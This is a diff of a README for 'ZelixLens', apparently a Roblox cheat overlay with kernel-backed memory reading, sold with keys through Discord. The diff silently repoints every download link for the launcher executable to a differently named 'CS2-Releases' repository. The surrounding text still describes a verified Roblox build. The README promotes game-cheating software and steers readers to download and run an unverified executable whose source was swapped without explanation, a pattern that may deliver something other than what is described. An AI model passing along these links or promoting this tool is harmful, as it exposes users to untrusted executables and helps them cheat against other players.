@@ -11,7 +11,7 @@
 [![Read-only](https://img.shields.io/badge/Memory-Read--Only-0891B2?style=for-the-badge)](#external-kernel-backed-and-read-only)
 [![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011%20x64-0078D4?style=for-the-badge&logo=windows&logoColor=white)](#system-requirements)
 
-[![Download ZelixLens](https://img.shields.io/badge/DOWNLOAD-Latest%20Launcher-16A34A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Zaroomx/ZelixLens-Roblox-Releases/releases/latest/download/ZelixLens-Launcher.zip)
+[![Download ZelixLens](https://img.shields.io/badge/DOWNLOAD-Latest%20Launcher-16A34A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Zaroomx/ZelixLens-CS2-Releases/releases/latest/download/ZelixLens-Launcher.zip)
 [![Join Discord](https://img.shields.io/badge/-JOIN%20DISCORD-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/nr78wGAfGd)
 
 **Official downloads are available from GitHub Releases and the ZelixLens Discord.**
@@ -97,11 +97,11 @@ overlay and Roblox-specific controls.
 
 | Download the software | Get access |
 |---|---|
-| Download `ZelixLens-Launcher.zip` using the permanent [latest-download link](https://github.com/Zaroomx/ZelixLens-Roblox-Releases/releases/latest/download/ZelixLens-Launcher.zip). The launcher downloads the newest verified Roblox build. | Join the [official ZelixLens Discord](https://discord.gg/nr78wGAfGd) to request a free two-hour trial or view current access options. |
+| Download `ZelixLens-Launcher.zip` using the permanent [latest-download link](https://github.com/Zaroomx/ZelixLens-CS2-Releases/releases/latest/download/ZelixLens-Launcher.zip). The launcher downloads the newest verified Roblox build. | Join the [official ZelixLens Discord](https://discord.gg/nr78wGAfGd) to request a free two-hour trial or view current access options. |
 
 <div align="center">
 
-[![Download package](https://img.shields.io/badge/DOWNLOAD-ZelixLens--Launcher.zip-16A34A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Zaroomx/ZelixLens-Roblox-Releases/releases/latest/download/ZelixLens-Launcher.zip)
+[![Download package](https://img.shields.io/badge/DOWNLOAD-ZelixLens--Launcher.zip-16A34A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Zaroomx/ZelixLens-CS2-Releases/releases/latest/download/ZelixLens-Launcher.zip)
 [![Get a key](https://img.shields.io/badge/GET%20A%20KEY-Official%20Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/nr78wGAfGd)
 
 </div>
@@ -116,7 +116,7 @@ packages from unofficial mirrors.
 
 ## Quick start
 
-1. Download `ZelixLens-Launcher.zip` from the permanent [latest-download link](https://github.com/Zaroomx/ZelixLens-Roblox-Releases/releases/latest/download/ZelixLens-Launcher.zip).
+1. Download `ZelixLens-Launcher.zip` from the permanent [latest-download link](https://github.com/Zaroomx/ZelixLens-CS2-Releases/releases/latest/download/ZelixLens-Launcher.zip).
 2. Extract the complete ZIP into its own folder.
 3. Run `ZelixLens.Launcher.exe`.
 4. Select **Roblox**. Choose **Download** if prompted, then enter your access key and select **Verify & Launch**.
@@ -171,7 +171,7 @@ ownership or source-code rights. See [LICENSE.md](LICENSE.md).
 
 <div align="center">
 
-**[Download latest](https://github.com/Zaroomx/ZelixLens-Roblox-Releases/releases/latest/download/ZelixLens-Launcher.zip)** · **[Get a key](https://discord.gg/nr78wGAfGd)** · **[Support](.github/SUPPORT.md)**
+**[Download latest](https://github.com/Zaroomx/ZelixLens-CS2-Releases/releases/latest/download/ZelixLens-Launcher.zip)** · **[Get a key](https://discord.gg/nr78wGAfGd)** · **[Support](.github/SUPPORT.md)**
 
 <sub>ZelixLens ROBLOX Edition · Official customer releases by Zaroomx</sub>
 
